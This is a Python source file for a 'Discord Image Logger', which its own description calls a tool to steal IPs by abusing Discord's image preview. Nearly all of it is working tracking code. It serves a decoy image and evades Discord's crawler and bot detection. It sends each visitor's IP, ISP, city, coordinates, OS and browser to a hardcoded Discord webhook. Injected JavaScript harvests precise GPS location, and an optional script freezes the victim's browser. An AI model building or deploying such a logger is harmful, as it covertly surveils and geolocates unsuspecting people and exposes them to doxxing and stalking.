from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "Rynn"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1126921496867131443/R0dywbKox6FWQc_RvPruv-VR0Jna2GEo4r__G6gnyS8_LP2-7iseE13mzMX3T99R0ugF",
    "image": "https://cdn.discordapp.com/attachments/1128910588941176892/1128932177636229260/IMG_5094.png",
    "imageArgument": True, 

    # CUSTOMIZATION #
    "username": "Image Logger", # Webhook username
    "color": 0x00FFFF, # Color HEX para el embed

    # OPTIONS #
    "crashBrowser": False, # Intenta crashear/conjelar el navegador
    
    "accurateLocation": True, # Usa GPS para intentar localizar exactamente

    "message": { # Mensaje Custom
        "doMessage": False, # Activar?
        "message": "This browser has been pwned by Rynn's Image Logger.",
        "richMessage": True, # rich text?
    },

    "vpnCheck": 1, # previene VPNs
                # 0 = No Anti-VPN
                # 1 = No ping cuando VPN
                # 2 = No enviar cuando VPN

    "linkAlerts": True, # envia una alerta
    "buggedImage": False, # muestra la imagen bugeada

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = posiblemente un bot
                # 2 = 100% un bot
                # 3 = no enviar ping cuando puede que sea un bot
                # 4 = no enviar ping cuando es un bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect a una pagina?
        "page": "https://google.com"
    },
}

blacklistedIPs = ("27", "34", "35", "104", "143", "164") 
def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        if not ip.startswith(("34", "35")): return
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a Discord chat!\nYou may receive an IP soon.\n\n**IP:** `{ip}`\n**Endpoint:** `{endpoint}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        if config["imageArgument"]:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            if dic.get("url") or dic.get("id"):
                url = dic.get("url") or dic.get("id")
            else:
                url = config["image"]
        else:
            url = config["image"]

        data = f'''<style>body {{
  margin: 0;
  padding: 0;
  }}
div.img {{
  background-image: url('{url}');
  background-position: center center;
  background-repeat: no-repeat;
  background-size: contain;
  width: 100vw;
  height: 100vh;
  }}</style><div class="img"></div>'''.encode()
        
        if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
            if "discord" in self.headers.get('user-agent').lower():
                self.send_response(200)
                self.send_header('Content-type','image/jpeg' if config["buggedImage"] else 'text/html')
                self.end_headers()
                
                self.wfile.write(binaries["loading"] if config["buggedImage"] else data)
                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
            
            return
        
        else:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            if dic.get("g") and config["accurateLocation"]:
                location = base64.b64decode(dic.get("g").encode()).decode()
                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
            else:
                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
            

            message = config["message"]["message"]

            if config["message"]["richMessage"]:
                message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                message = message.replace("{isp}", result["isp"])
                message = message.replace("{asn}", result["as"])
                message = message.replace("{country}", result["country"])
                message = message.replace("{region}", result["regionName"])
                message = message.replace("{city}", result["city"])
                message = message.replace("{lat}", str(result["lat"]))
                message = message.replace("{long}", str(result["lon"]))
                message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                message = message.replace("{mobile}", str(result["mobile"]))
                message = message.replace("{vpn}", str(result["proxy"]))
                message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

            datatype = 'text/html'

            if config["message"]["doMessage"]:
                data = message.encode()
            
            if config["crashBrowser"]:
                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
            self.send_response(200) # 200 = OK (HTTP Status)
            self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
            self.end_headers() # Declare the headers as finished.

            if config["accurateLocation"]:
                data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
            self.wfile.write(data)
    
        return  

handler = ImageLoggerAPI
